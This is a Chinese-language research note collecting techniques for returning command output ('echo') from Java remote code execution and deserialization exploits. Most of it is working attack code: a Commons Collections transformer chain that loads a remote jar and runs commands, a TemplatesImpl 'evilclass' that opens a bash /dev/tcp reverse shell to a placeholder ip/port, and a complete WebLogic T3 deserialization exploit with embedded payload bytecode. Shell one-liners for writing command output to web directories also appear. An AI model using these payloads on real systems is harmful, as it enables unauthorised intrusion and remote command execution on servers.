# java回显

**2022/5/2更新,发现fnmsd师傅弄跟dsf的回显感觉很np**
```
https://blog.csdn.net/fnmsd/article/details/106709736
https://blog.csdn.net/fnmsd/article/details/106890242
```

发现个好项目 https://github.com/feihong-cs/Java-Rce-Echo

>一般web服务是想办法获得response对象，可以参考[2021RCTF ezshell](https://github.com/Firebasky/ctf-Challenge/tree/main/RCTF-2021-EZshell)

### 异常回显

我们将命令执行的结果给Exception(result),因为Exception可以传递string,在抛出异常throw e;之后在命令执行的过程中如果目标的代码逻辑存在过程中错误抛出异常就可以看到回显内容

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;
public class RunCheckConfig {
public RunCheckConfig(String  args) throws Exception
{
Process proc = Runtime.getRuntime().exec(args);
BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
StringBuffer sb = new StringBuffer();
String line;
while ((line = br.readLine()) != null)
{
sb.append(line).append("\n");
}
String result = sb.toString();
Exception e=new Exception(result);
throw e;
}
}
```
**目前暂时没有找到真实的demo.....**

### URLClassLoader抛出异常

```java
package exploit.firebasky;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class ErrorBaseExec
{
    public ErrorBaseExec(String cmd) throws Exception{
        do_exec(cmd);
    }

    public static byte[] readBytes(InputStream in)
            throws IOException
    {
        BufferedInputStream bufin = new BufferedInputStream(in);
        int buffSize = 1024;
        ByteArrayOutputStream out = new ByteArrayOutputStream(buffSize);
        byte[] temp = new byte[buffSize];
        int size = 0;
        while ((size = bufin.read(temp)) != -1) {
            out.write(temp, 0, size);
        }
        bufin.close();

        byte[] content = out.toByteArray();

        return content;
    }

    public static void do_exec(String cmd)
            throws Exception
    {
        Process p = Runtime.getRuntime().exec(cmd);
        byte[] stderr = readBytes(p.getErrorStream());
        byte[] stdout = readBytes(p.getInputStream());
        int exitValue = p.waitFor();
        if (exitValue == 0) {
            throw new Exception("-----------------\r\n" + new String(stdout) + "-----------------\r\n");
        }
        throw new Exception("-----------------\r\n" + new String(stderr) + "-----------------\r\n");
    }

    public static void main(String[] args)
            throws Exception
    {
        do_exec(args[0]);
    }
}
```
编译成jar之后可以封装到cc利用链组件中
```java
public static Transformer[] EchoCC() throws Exception  {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(URLClassLoader.class),
            new InvokerTransformer("getConstructor",
                new Class[]{Class[].class},
                new Object[]{new Class[]{URL[].class}}),
            new InvokerTransformer("newInstance",
                new Class[]{Object[].class},
                new Object[]{new Object[]{new URL[]{new URL("http://127.0.0.1:8099/ErrorBaseExec.jar")}}}),
            new InvokerTransformer("loadClass",
                new Class[]{String.class},
                new Object[]{"exploit.firebasky.ErrorBaseExec"}),
            new InvokerTransformer("getConstructor",
                new Class[]{Class[].class},
                new Object[]{new Class[]{String.class}}),
            new InvokerTransformer("newInstance",
                new Class[]{Object[].class},
                new Object[]{new String[]{"ipconfig"}})
        };
        return transformers;
    }
```
### defineClass
其实就是通过ClassLoader去执行(反射)我们自定义类的字节码。

```java
public static String FiletoBytes(String filename) throws Exception{
        String buf = null;
        File file = new File(filename);
        FileInputStream fis = null;
        try {
            fis = new FileInputStream(file);
            int size = fis.available();
            byte[] bytes = new byte[size];
            fis.read(bytes);
            buf = Arrays.toString(bytes);
            fis.close();
            return buf;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return buf;
    }
    
@Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        if (name == myClassName) {
            System.out.println("加载" + name + "类");
            return defineClass(myClassName, bs, 0, bs.length);
        }
        return super.findClass(name);
    }    
```

### 中间件回显
由于没有是研究tomcat等容器的回显。能力有限。


>中间件而言多数重写了thread类，在thread中保存了req和resp，可以通过获取当前线程，在resp中写入回显结果



参考：https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/

直接用项目的代码。

在利用tempimpl创建类的时候可以使用如下代码
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class evilclass extends AbstractTranslet  {
    static {
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        }catch (IOException e){
            try{
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
            }catch (IOException ee){
            }
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

### RMI绑定实例
通过加载执行代码，相当于创建了一个server的rmi实现了定义接口的方法返回是返回执行命令的结果，然后客户端去调用创建的rmi的接口方法，获得返回值。

可以参考weblogic回显通过rmi.
```java

package com.test;

import com.supeream.serial.Reflections;
import com.supeream.serial.SerialDataGenerator;
import com.supeream.serial.Serializables;
import com.supeream.ssl.WeblogicTrustManager;
import com.supeream.weblogic.T3ProtocolOperation;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.classfile.DefiningClassLoader;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.corba.utils.MarshalledObject;
import weblogic.jndi.Environment;

import javax.naming.Context;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Main {
    private static String host = "172.16.2.129";
    private static String port = "7001";
    private static final String classname = "com.test.payload.RemoteImpl";
    private static final byte[] bs = new byte[]{
        -54, -2, -70, -66, 0, 0, 0, 50, 0, -116, 10, 0, 32, 0, 83, 7, 0, 84, 10, 0, 2, 0, 83, 7, 0, 85, 10, 0, 4, 0, 83, 8, 0, 86, 11, 0, 87, 0, 88, 10, 0, 2, 0, 89, 7, 0, 90, 10, 0, 9, 0, 91, 7, 0, 92, 10, 0, 11, 0, 83, 8, 0, 93, 11, 0, 94, 0, 95, 8, 0, 96, 7, 0, 97, 10, 0, 16, 0, 98, 10, 0, 16, 0, 99, 10, 0, 16, 0, 100, 7, 0, 101, 7, 0, 102, 10, 0, 103, 0, 104, 10, 0, 21, 0, 105, 10, 0, 20, 0, 106, 7, 0, 107, 10, 0, 25, 0, 83, 10, 0, 20, 0, 108, 10, 0, 25, 0, 109, 8, 0, 110, 10, 0, 25, 0, 111, 10, 0, 9, 0, 112, 7, 0, 113, 7, 0, 114, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 29, 76, 99, 111, 109, 47, 116, 101, 115, 116, 47, 112, 97, 121, 108, 111, 97, 100, 47, 82, 101, 109, 111, 116, 101, 73, 109, 112, 108, 59, 1, 0, 4, 109, 97, 105, 110, 1, 0, 22, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 7, 99, 111, 110, 116, 101, 120, 116, 1, 0, 22, 76, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110, 103, 47, 67, 111, 110, 116, 101, 120, 116, 59, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 4, 97, 114, 103, 115, 1, 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 114, 101, 109, 111, 116, 101, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 48, 7, 0, 84, 7, 0, 90, 1, 0, 17, 115, 101, 116, 83, 101, 114, 118, 101, 114, 76, 111, 99, 97, 116, 105, 111, 110, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 3, 99, 109, 100, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 115, 1, 0, 17, 103, 101, 116, 83, 101, 114, 118, 101, 114, 76, 111, 99, 97, 116, 105, 111, 110, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 4, 99, 109, 100, 115, 1, 0, 16, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 59, 1, 0, 14, 112, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 1, 0, 26, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 4, 112, 114, 111, 99, 1, 0, 19, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 2, 98, 114, 1, 0, 24, 76, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 59, 1, 0, 2, 115, 98, 1, 0, 24, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 59, 1, 0, 4, 108, 105, 110, 101, 1, 0, 22, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 121, 112, 101, 84, 97, 98, 108, 101, 1, 0, 36, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 60, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 62, 59, 7, 0, 116, 7, 0, 117, 7, 0, 97, 7, 0, 118, 7, 0, 101, 7, 0, 107, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 36, 82, 101, 109, 111, 116, 101, 73, 109, 112, 108, 46, 106, 97, 118, 97, 32, 102, 114, 111, 109, 32, 73, 110, 112, 117, 116, 70, 105, 108, 101, 79, 98, 106, 101, 99, 116, 12, 0, 34, 0, 35, 1, 0, 27, 99, 111, 109, 47, 116, 101, 115, 116, 47, 112, 97, 121, 108, 111, 97, 100, 47, 82, 101, 109, 111, 116, 101, 73, 109, 112, 108, 1, 0, 27, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110, 103, 47, 73, 110, 105, 116, 105, 97, 108, 67, 111, 110, 116, 101, 120, 116, 1, 0, 4, 89, 52, 101, 114, 7, 0, 119, 12, 0, 120, 0, 121, 12, 0, 60, 0, 61, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 122, 0, 35, 1, 0, 19, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 65, 114, 114, 97, 121, 76, 105, 115, 116, 1, 0, 9, 47, 98, 105, 110, 47, 98, 97, 115, 104, 7, 0, 117, 12, 0, 123, 0, 124, 1, 0, 2, 45, 99, 1, 0, 24, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 12, 0, 34, 0, 125, 12, 0, 126, 0, 127, 12, 0, -128, 0, -127, 1, 0, 22, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 1, 0, 25, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 7, 0, 118, 12, 0, -126, 0, -125, 12, 0, 34, 0, -124, 12, 0, 34, 0, -123, 1, 0, 22, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 12, 0, -122, 0, -121, 12, 0, -120, 0, -119, 1, 0, 1, 10, 12, 0, -118, 0, -121, 12, 0, -117, 0, -121, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 46, 119, 101, 98, 108, 111, 103, 105, 99, 47, 99, 108, 117, 115, 116, 101, 114, 47, 115, 105, 110, 103, 108, 101, 116, 111, 110, 47, 67, 108, 117, 115, 116, 101, 114, 77, 97, 115, 116, 101, 114, 82, 101, 109, 111, 116, 101, 1, 0, 24, 106, 97, 118, 97, 47, 114, 109, 105, 47, 82, 101, 109, 111, 116, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 14, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 1, 0, 20, 106, 97, 118, 97, 120, 47, 110, 97, 109, 105, 110, 103, 47, 67, 111, 110, 116, 101, 120, 116, 1, 0, 6, 114, 101, 98, 105, 110, 100, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 86, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101, 1, 0, 3, 97, 100, 100, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 90, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 76, 105, 115, 116, 59, 41, 86, 1, 0, 19, 114, 101, 100, 105, 114, 101, 99, 116, 69, 114, 114, 111, 114, 83, 116, 114, 101, 97, 109, 1, 0, 29, 40, 90, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 5, 115, 116, 97, 114, 116, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 41, 86, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 82, 101, 97, 100, 101, 114, 59, 41, 86, 1, 0, 8, 114, 101, 97, 100, 76, 105, 110, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 97, 112, 112, 101, 110, 100, 1, 0, 44, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 59, 1, 0, 8, 116, 111, 83, 116, 114, 105, 110, 103, 1, 0, 10, 103, 101, 116, 77, 101, 115, 115, 97, 103, 101, 0, 33, 0, 2, 0, 32, 0, 1, 0, 33, 0, 0, 0, 4, 0, 1, 0, 34, 0, 35, 0, 1, 0, 36, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 37, 0, 0, 0, 6, 0, 1, 0, 0, 0, 14, 0, 38, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 39, 0, 40, 0, 0, 0, 9, 0, 41, 0, 42, 0, 1, 0, 36, 0, 0, 0, -81, 0, 3, 0, 3, 0, 0, 0, 42, -69, 0, 2, 89, -73, 0, 3, 76, -69, 0, 4, 89, -73, 0, 5, 77, 44, 18, 6, 43, -71, 0, 7, 3, 0, 43, 42, 3, 50, -74, 0, 8, 87, -89, 0, 8, 77, 44, -74, 0, 10, -79, 0, 1, 0, 8, 0, 33, 0, 36, 0, 9, 0, 3, 0, 37, 0, 0, 0, 34, 0, 8, 0, 0, 0, 17, 0, 8, 0, 19, 0, 16, 0, 20, 0, 25, 0, 21, 0, 33, 0, 24, 0, 36, 0, 22, 0, 37, 0, 23, 0, 41, 0, 25, 0, 38, 0, 0, 0, 42, 0, 4, 0, 16, 0, 17, 0, 43, 0, 44, 0, 2, 0, 37, 0, 4, 0, 45, 0, 46, 0, 2, 0, 0, 0, 42, 0, 47, 0, 48, 0, 0, 0, 8, 0, 34, 0, 49, 0, 40, 0, 1, 0, 50, 0, 0, 0, 19, 0, 2, -1, 0, 36, 0, 2, 7, 0, 51, 7, 0, 52, 0, 1, 7, 0, 53, 4, 0, 1, 0, 54, 0, 55, 0, 2, 0, 36, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 37, 0, 0, 0, 6, 0, 1, 0, 0, 0, 31, 0, 38, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 39, 0, 40, 0, 0, 0, 0, 0, 1, 0, 56, 0, 57, 0, 1, 0, 0, 0, 1, 0, 47, 0, 57, 0, 2, 0, 58, 0, 0, 0, 4, 0, 1, 0, 59, 0, 1, 0, 60, 0, 61, 0, 2, 0, 36, 0, 0, 1, 126, 0, 5, 0, 8, 0, 0, 0, 124, -69, 0, 11, 89, -73, 0, 12, 77, 44, 18, 13, -71, 0, 14, 2, 0, 87, 44, 18, 15, -71, 0, 14, 2, 0, 87, 44, 43, -71, 0, 14, 2, 0, 87, -69, 0, 16, 89, 44, -73, 0, 17, 78, 45, 4, -74, 0, 18, 87, 45, -74, 0, 19, 58, 4, -69, 0, 20, 89, -69, 0, 21, 89, 25, 4, -74, 0, 22, -73, 0, 23, -73, 0, 24, 58, 5, -69, 0, 25, 89, -73, 0, 26, 58, 6, 25, 5, -74, 0, 27, 89, 58, 7, -58, 0, 19, 25, 6, 25, 7, -74, 0, 28, 18, 29, -74, 0, 28, 87, -89, -1, -24, 25, 6, -74, 0, 30, -80, 77, 44, -74, 0, 31, -80, 0, 1, 0, 0, 0, 117, 0, 118, 0, 9, 0, 4, 0, 37, 0, 0, 0, 58, 0, 14, 0, 0, 0, 38, 0, 8, 0, 40, 0, 17, 0, 41, 0, 26, 0, 42, 0, 34, 0, 44, 0, 43, 0, 45, 0, 49, 0, 46, 0, 55, 0, 48, 0, 76, 0, 49, 0, 85, 0, 52, 0, 96, 0, 53, 0, 112, 0, 56, 0, 118, 0, 57, 0, 119, 0, 58, 0, 38, 0, 0, 0, 92, 0, 9, 0, 8, 0, 110, 0, 62, 0, 63, 0, 2, 0, 43, 0, 75, 0, 64, 0, 65, 0, 3, 0, 55, 0, 63, 0, 66, 0, 67, 0, 4, 0, 76, 0, 42, 0, 68, 0, 69, 0, 5, 0, 85, 0, 33, 0, 70, 0, 71, 0, 6, 0, 93, 0, 25, 0, 72, 0, 57, 0, 7, 0, 119, 0, 5, 0, 45, 0, 46, 0, 2, 0, 0, 0, 124, 0, 39, 0, 40, 0, 0, 0, 0, 0, 124, 0, 56, 0, 57, 0, 1, 0, 73, 0, 0, 0, 12, 0, 1, 0, 8, 0, 110, 0, 62, 0, 74, 0, 2, 0, 50, 0, 0, 0, 52, 0, 3, -1, 0, 85, 0, 7, 7, 0, 52, 7, 0, 75, 7, 0, 76, 7, 0, 77, 7, 0, 78, 7, 0, 79, 7, 0, 80, 0, 0, -4, 0, 26, 7, 0, 75, -1, 0, 5, 0, 2, 7, 0, 52, 7, 0, 75, 0, 1, 7, 0, 53, 0, 58, 0, 0, 0, 4, 0, 1, 0, 59, 0, 1, 0, 81, 0, 0, 0, 2, 0, 82,
    };

    public static void main(String[] args) {
        try {
            String url = "t3://" + host + ":" + port;
            // 安装RMI实例
            invokeRMI(classname, bs);

            Environment environment = new Environment();
            environment.setProviderUrl(url);
            environment.setEnableServerAffinity(false);
            environment.setSSLClientTrustManager(new WeblogicTrustManager());
            Context context = environment.getInitialContext();
            ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup("Y4er");

            // 调用RMI实例执行命令
            String res = remote.getServerLocation("ifconfig");
            System.out.println(res);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static void invokeRMI(String className, byte[] clsData) throws Exception {
        // common-collection1 构造transformers 定义自己的RMI接口
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(DefiningClassLoader.class),
            new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
            new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
            new InvokerTransformer("defineClass",
                                   new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{null}}),
            new ConstantTransformer(new HashSet())};

        final Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        InvocationHandler handler = (InvocationHandler) Reflections
            .getFirstCtor(
            "sun.reflect.annotation.AnnotationInvocationHandler")
            .newInstance(Override.class, lazyMap);

        final Map mapProxy = Map.class
            .cast(Proxy.newProxyInstance(SerialDataGenerator.class.getClassLoader(),
                                         new Class[]{Map.class}, handler));

        handler = (InvocationHandler) Reflections.getFirstCtor(
            "sun.reflect.annotation.AnnotationInvocationHandler")
            .newInstance(Override.class, mapProxy);

        // 序列化数据 MarshalledObject绕过
        Object obj = new MarshalledObject(handler);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.flush();
        objOut.close();
        byte[] payload = out.toByteArray();
        // t3发送
        T3ProtocolOperation.send(host, port, payload);
    }
}
```
#### weblogic

https://xz.aliyun.com/t/5299

https://github.com/lufeirider/CVE-2019-2725


### 通过写文件
linux
```bash
// 进入test.html的根目录并执行id命令写入1.txt
cd $(find -name "test.html" -type f -exec dirname {} \; | sed 1q) && echo `id` > 1.txt
```
win
```bash
$file = Get-ChildItem -Path . -Filter test.html -recurse -ErrorAction SilentlyContinue;$f = -Join($file.DirectoryName,"/a.txt");echo 222 |Out-File $f
```

### Apereo CAS 回显

https://www.00theway.org/2020/01/04/apereo-cas-rce/

https://www.freebuf.com/vuls/226149.html


org.springframework.webflow.context.ExternalContextHolder.getExternalContext()方法可以获取到上下文关联信息，然后通过getNativeRequest()方法获取request对象通过getNativeResponse()方法获取response对象。同时提及到org.springframework.cglib.core.ReflectUtils.defineClass().newInstance();加载payload。猜测大佬的想法是通过defineClass从byte[]还原出一个Class对象，该恶意对象主要是执行命令，获取response对象，将执行命令后的结果通过response对象的输出流输出。

参考代码实现：https://github.com/potats0/CasExp/blob/master/src/main/java/payloads/exploitType/exploitDump.java



>参考：
>
>[Java 反序列化回显的多种姿势](https://www.joyk.com/dig/detail/1624894461629758)
>
>[Java Web代码执行漏洞回显总结](https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/)
>
>[通杀漏洞利用回显方法-linux平台](https://www.00theway.org/2020/01/17/java-god-s-eye/)
>
>[linux下java反序列化通杀回显方法的低配版实现](https://xz.aliyun.com/t/7307)
> 
>[Tomcat中一种半通用回显方法](https://xz.aliyun.com/t/7348)     
>
>[Java反射-修改字段值, 反射修改static final修饰的字段](https://www.cnblogs.com/noKing/p/9038234.html)
>
>[基于全局储存的新思路 | Tomcat的一种通用回显方法研究](https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484799&idx=1&sn=42e7807d6ea0d8917b45e8aa2e4dba44)
>
>[tomcat不出网回显连续剧第六集](https://xz.aliyun.com/t/7535)
>
>[前尘——返回执行结果的回显链](https://www.anquanke.com/post/id/253661)
>
>[Weblogic使用ClassLoader和RMI来回显命令执行结果](https://xz.aliyun.com/t/7228)
>[JAVA反序列化回显学习](https://cangqingzhe.github.io/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/)
